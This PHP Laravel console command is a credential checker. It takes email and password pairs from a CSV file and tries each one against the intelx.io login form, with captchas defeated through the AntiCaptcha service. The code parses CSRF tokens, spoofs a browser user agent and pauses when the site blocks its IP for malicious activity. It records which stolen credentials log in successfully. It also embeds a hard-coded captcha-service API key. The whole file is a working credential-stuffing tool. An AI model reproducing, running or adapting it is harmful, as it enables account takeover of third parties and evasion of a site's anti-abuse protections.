<?php

namespace App\Console\Commands\BOT;

use App\Etc\AntiCaptcha\ImageToText;
use DOMDocument;
use DOMXPath;
use GuzzleHttp\Client;
use GuzzleHttp\Cookie\CookieJar;
use GuzzleHttp\Cookie\SetCookie;
use GuzzleHttp\Exception\ClientException;
use GuzzleHttp\Promise\Utils;
use Illuminate\Console\Command;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Storage;
use Symfony\Component\Console\Helper\ProgressBar;

class Checker extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'bot:checker {--file=} {--output=} {--overwrite}';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Command description';

    private $handler_in;
    private $handler_out;
    private bool $overwrite = false;
    private int $wait_time = 90;

    private function getCSRFToken(string $body): string
    {
        $dom = new DOMDocument();
        @$dom->loadHTML($body);
        $xpath = new DOMXPath($dom);
        $csrf_token = $xpath->query("//input[@name='login_form[login_form_csrf_token]']")->item(0)->getAttribute('value');
        return $csrf_token;
    }

    private function getCaptchaId(string $body): string
    {
        $dom = new DOMDocument();
        @$dom->loadHTML($body);
        $xpath = new DOMXPath($dom);
        return $xpath->query("//input[@name='login_form[captcha][id]']")->item(0)->getAttribute('value');
    }

    private function getCaptchaImage(string $body): string
    {
        $dom = new DOMDocument();
        @$dom->loadHTML($body);
        $xpath = new DOMXPath($dom);
        return $xpath->query("//img[contains(@src, '/captcha/')]")->item(0)->getAttribute('src');
    }

    private function isReachedLimit(string $body): bool
    {
        $dom = new DOMDocument();
        @$dom->loadHTML($body);
        $xpath = new DOMXPath($dom);
        $limit = $xpath->query("//div[@id='loginModal']")->item(0);
        return str_contains($limit->textContent, 'You have reached your daily limit');
    }

    private function isFailedLogin(string $body): bool
    {
        $dom = new DOMDocument();
        @$dom->loadHTML($body);
        $xpath = new DOMXPath($dom);
        $limit = $xpath->query("//div[@id='loginModal']")->item(0);
        return str_contains($limit->textContent, 'Login Error: The provided login information is invalid.');
    }

    private function isBlocked(string $body): bool
    {
        $dom = new DOMDocument();
        @$dom->loadHTML($body);
        $xpath = new DOMXPath($dom);
        $limit = $xpath->query("//div[@id='loginModal']")->item(0);
        return str_contains($limit->textContent, 'You are temporarily blocked due to malicious activity detected from your IP');
    }

    private function isIncorrectCaptcha(string $body): bool
    {
        $dom = new DOMDocument();
        @$dom->loadHTML($body);
        $xpath = new DOMXPath($dom);
        $limit = $xpath->query("//div[@id='loginModal']")->item(0);
        return str_contains($limit->textContent, 'Please, correct the code.');
    }

    private function getFormData(string $body)
    {
        $dom = new DOMDocument();
        @$dom->loadHTML($body);
        $xpath = new DOMXPath($dom);
        return $xpath->query("//form[@id='loginForm']")->item(0);
    }

    /**
     * Execute the console command.
     */
    public function handle()
    {
        // Prepare Guzzle Client
        $client = new Client([
            'base_uri' => "https://intelx.io",
            'timeout' => 30.0,
            'headers' => [
                'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
            ],
        ]);

        $in = Storage::disk('in');
        $out = Storage::disk('out');

        $this->overwrite = $this->option('overwrite') ?? false;

        $this->info('Starting...');

        $input = $this->option('file') ?? 'default.csv';

        if (!$in->exists($input)) {
            $this->error('Input file not found.');
            return Command::FAILURE;
        }

        $output = $this->option('output') ?? 'default-checked.csv';

        if ($out->exists($output) && !$this->overwrite) {
            $this->error('Output file already exists.');
            return Command::FAILURE;
        }

        if (!Storage::exists('checker/responses')) {
            Storage::makeDirectory('checker/responses');
        }

        $this->handler_in = fopen($in->path($input), 'r');
        $this->handler_out = fopen($out->path($output), 'w');

        $line = 0;
        while (($lineData = fgetcsv($this->handler_in, 0, "\n")) !== false) {
            $line++;

            if ($line === 1) {
                continue;
            }

            $rows = explode(';', $lineData[0]);
            $email = $rows[2];
            $password = $rows[3];

            $this->info("Checking {$email}...");

            $response = $client->get('/login');

            $headerSetCookies = $response->getHeader('Set-Cookie');

            $cookies = [];
            foreach ($headerSetCookies as $key => $header) {
                $cookie = SetCookie::fromString($header);
                $cookie->setDomain('intelx.io');
                $cookies[] = $cookie;
            }
            $cookieJar = new CookieJar(false, $cookies);

            $body = $response->getBody()->getContents();

            if ($this->isBlocked($body)) {
                Storage::put('checker/responses/' . $email . '.html', $body);
                $this->error("IP temporarily blocked, waiting {$this->wait_time} seconds...");
                sleep($this->wait_time);
                continue;
            }

            $csrf_token = $this->getCSRFToken($body);
            $captcha_id = $this->getCaptchaId($body);
            $captcha_image = $this->getCaptchaImage($body);

            if (Storage::exists('captcha/' . $captcha_id . '.png')) {
                $this->info('Captcha image already exists.');
            } else {
                $this->info('Downloading captcha image...');
                $response = $client->get($captcha_image);
                Storage::put('captcha/' . $captcha_id . '.png', $response->getBody()->getContents());
            }

            if (Storage::exists('captcha/' . $captcha_id . '.txt')) {
                $this->info('Captcha text already exists.');
                $captchaText = Storage::get('captcha/' . $captcha_id . '.txt');
            } else {
                $this->info('Solving captcha...');
                $captcha = new ImageToText();
                // $captcha->setVerboseMode(true);
                $captcha->setKey('453b728fa2ed180216c46e6456c7f298'); // AntiCaptcha API Key
                $captcha->setSoftId(0); // Soft ID, optional
                $captcha->setFile(storage_path('app/captcha/' . $captcha_id . '.png'));

                if (!$captcha->createTask()) {
                    $this->error("API v2 send failed - " . $captcha->getErrorMessage());
                    exit;
                }

                $taskId = $captcha->getTaskId();

                if (!$captcha->waitForResult()) {
                    $this->info("Could not solve captcha");
                    $this->info($captcha->getErrorMessage());
                } else {
                    $captchaText = $captcha->getTaskSolution();
                    Storage::put('captcha/' . $captcha_id . '.txt', $captchaText);
                    $this->info("Captcha solved!");
                }
            }

            $this->info("CSRF Token: {$csrf_token}");
            $this->info("Captcha ID: {$captcha_id} ({$captcha_image})");
            $this->info("Captcha Input: {$captchaText}");

            $request = $client->post('/login', [
                'cookies' => $cookieJar,
                'form_params' => [
                    'login_form[login_form_csrf_token]' => $csrf_token,
                    'login_form[r]' => '',
                    'login_form[username]' => $email,
                    'login_form[password]' => $password,
                    'login_form[captcha][input]' => $captchaText,
                    'login_form[captcha][id]' => $captcha_id,
                ],
            ]);

            $body = $request->getBody()->getContents();

            if ($this->isBlocked($body)) {
                Storage::put('checker/responses/' . $email . '.html', $body);
                $this->error("IP temporarily blocked, waiting {$this->wait_time} seconds...");
                sleep($this->wait_time);
                continue;
            }

            if ($this->isFailedLogin($body)) {
                $this->error('Login failed.');
                fputcsv($this->handler_out, array_merge($rows, ['Login failed']), ';');
            } elseif ($this->isReachedLimit($body)) {
                $this->warn('Reached daily limit for user.');
                fputcsv($this->handler_out, array_merge($rows, ['Reached daily limit for user']), ';');
            } elseif ($this->isIncorrectCaptcha($body)) {
                $this->error('Incorrect captcha.');
                fputcsv($this->handler_out, array_merge($rows, ['Incorrect captcha']), ';');
            } else {
                $this->info('Login success.');
                fputcsv($this->handler_out, array_merge($rows, ['Login success']), ';');
            }

            Storage::put('checker/responses/' . $email . '.html', $body);

            $this->newLine();
        }

        fclose($this->handler_in);
        fclose($this->handler_out);
        $this->info('Done.');

        return Command::SUCCESS;
    }
}
